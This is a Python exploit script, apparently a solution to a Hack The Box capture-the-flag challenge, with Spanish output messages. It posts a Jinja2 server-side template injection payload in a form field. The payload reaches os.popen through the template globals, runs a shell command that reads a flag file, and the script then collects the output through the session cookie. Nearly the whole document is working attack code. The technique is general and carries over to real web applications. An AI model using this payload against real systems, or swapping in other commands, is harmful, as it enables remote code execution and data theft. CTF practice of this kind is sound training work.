# By GuchiHacker

import sys
import requests
import re

def get_flag(target):
    try:
        ip, port = target.split(":")
        
        url_begin = f"http://{ip}:{port}/begin"
        headers_begin = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        payload_begin = "warrior_name={{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat+/app/flag.txt').read()+}}"
        response_begin = requests.post(url_begin, headers=headers_begin, data=payload_begin)
        response_begin.raise_for_status()
        
        session_cookie = response_begin.cookies.get("session")
        if not session_cookie:
            print("Error: No se obtuvo la cookie de sesión.")
            return
        
        url_report = f"http://{ip}:{port}/battle-report"
        headers_report = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"session={session_cookie}"
        }
        
        response_report = requests.post(url_report, headers=headers_report, data="")
        response_report.raise_for_status()

        flag_match = re.search(r'HTB\{.*?\}', response_report.text)
        if flag_match:
            print("Flag encontrada:", flag_match.group(0))
        else:
            print("No se encontró la flag en la respuesta.")
    
    except Exception as e:
        print("Error:", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <IP:PUERTO>")
    else:
        get_flag(sys.argv[1])
